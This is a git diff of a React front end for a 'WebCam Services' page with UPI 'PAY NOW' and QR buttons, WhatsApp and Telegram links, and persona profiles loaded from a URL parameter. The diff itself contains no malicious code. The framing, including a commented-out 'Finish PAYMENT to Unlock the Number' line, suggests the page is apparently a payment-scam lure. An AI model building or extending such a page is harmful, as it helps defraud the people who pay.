@@ -5,9 +5,10 @@ import WhatsappModal from './WhatsappModal';
 import PaymentModal from './PaymentModal';
 import ProfileCard from './ProfileCard';
 import QRCard from './QRCard';
-import profiles from './profiles';
+import profiles, { setProfiles } from './profiles';
 import './sidebar.css'
-import { useHistory, useLocation } from 'react-router-dom';
+import { useHistory } from 'react-router-dom';
+import { useParams } from 'react-router-dom/cjs/react-router-dom.min';
 
 let ip = 'Not Found'
 
@@ -45,13 +46,23 @@ export const modals = {
 }
 
 function App(props) {
+  const { user } = useParams();
   const history = useHistory();
+  const [profile, setProfile] = useState({ telegram: "" });
   const [activeModal, setActiveModal] = useState(modals.none)
   const [app, setApp] = useState("phonepe")
   const [isQROpen, setIsQROpen] = useState(props.isQROpen ? props.isQROpen : false);
   const [isPaymentOpen, setIsPaymentOpen] = useState(props.isPaymentModalOpen ? props.isPaymentModalOpen : false);
   const [isWhatsappOpen, setIsWhatsappOpen] = useState(false);
-  const profile = profiles[process.env.REACT_APP_USERNAME?.toLowerCase()] || profiles['shruthie'];
+  console.log(user);
+  useEffect(() => {
+    console.log("setting Profiles")
+    setProfiles().then(profiles => {
+      setProfile(user ? profiles[user] : profiles['shruthie']);
+
+    })
+    console.log(profiles);
+  }, [user])
 
   useEffect(() => {
     switch (activeModal) {
@@ -115,7 +126,7 @@ function App(props) {
     <div className="App" onClick={() => { /*setisOpen(false) */ }}>
       <div>
         <h6 id='serviceName'>WebCam Services</h6>
-        <ProfileCard />
+        <ProfileCard profile={profile} />
         <div >
           <button className='button' style={{ background: "#00a3ff", padding: "0px 25px" }}
             onClick={
@@ -126,15 +137,15 @@ function App(props) {
             }>
             {"Login for free Demo"}</button>
         </div>
-
+        {console.log(profile)}
         <div className="msgBtn">
           {/* <h6>{"Finish PAYMENT to Unlock the Number!!😜"}</h6> */}
           <div className='btnGrp'>
             <button className='button' onClick={() => { handlepayButton() }}>
-              <img src="./upiwhite.png" style={{ width: '30px', margin: '-4px 4px 0px -3px' }} alt="QR CODE"></img>
+              <img src="../upiwhite.png" style={{ width: '30px', margin: '-4px 4px 0px -3px' }} alt="QR CODE"></img>
               {"PAY NOW!!"}</button>
             <button className='button' onClick={() => { handleQRButton() }}>
-              <img src="./qr-code.png" style={{ width: '20px', margin: '-4px 4px 0px -3px' }} alt="QR CODE"></img>
+              <img src="../qr-code.png" style={{ width: '20px', margin: '-4px 4px 0px -3px' }} alt="QR CODE"></img>
               {"QR Code"}</button>
           </div>
         </div>
@@ -145,12 +156,12 @@ function App(props) {
           </div>
           <div className='btnGrp'>
             <button className='button' onClick={() => { handleWspButton() }}>
-              <img src="./whatsapp.png" style={{ width: '28px', margin: '-4px 2px 0 -3px' }} alt="whatsapp logo"></img>
+              <img src="../whatsapp.png" style={{ width: '28px', margin: '-4px 2px 0 -3px' }} alt="whatsapp logo"></img>
               {"Whatsapp"}
             </button>
             <button className="button" style={{ background: "#00a3ff" }}>
-              <img src="./tg.svg" style={{ width: '24px', margin: '-4px 1px 0 -3px' }} alt="Telegram logo"></img>
-              <a href={`https://t.me/${profile.telegram}`} style={{ color: "white" }}> Telegram </a>
+              <img src="../tg.svg" style={{ width: '24px', margin: '-4px 1px 0 -3px' }} alt="Telegram logo"></img>
+              <a href={`https://t.me/${profile?.telegram}`} style={{ color: "white" }}> Telegram </a>
             </button>
           </div>
         </div>
@@ -171,7 +182,7 @@ function App(props) {
         </div>
         <WhatsappModal isOpen={isWhatsappOpen} setisOpen={setIsWhatsappOpen} togglePay={togglePay} className="special_modal"></WhatsappModal>
         <PaymentModal isOpen={isPaymentOpen} setisOpen={setIsPaymentOpen} handleModals={handleModals} className="special_modal2"></PaymentModal>
-        <QRCard isOpen={isQROpen} setisOpen={setIsQROpen} handleModals={handleModals} app={app} className="special_modal2"></QRCard>
+        <QRCard profile={profile} isOpen={isQROpen} setisOpen={setIsQROpen} handleModals={handleModals} app={app} className="special_modal2"></QRCard>
       </div>
     </div >
   );
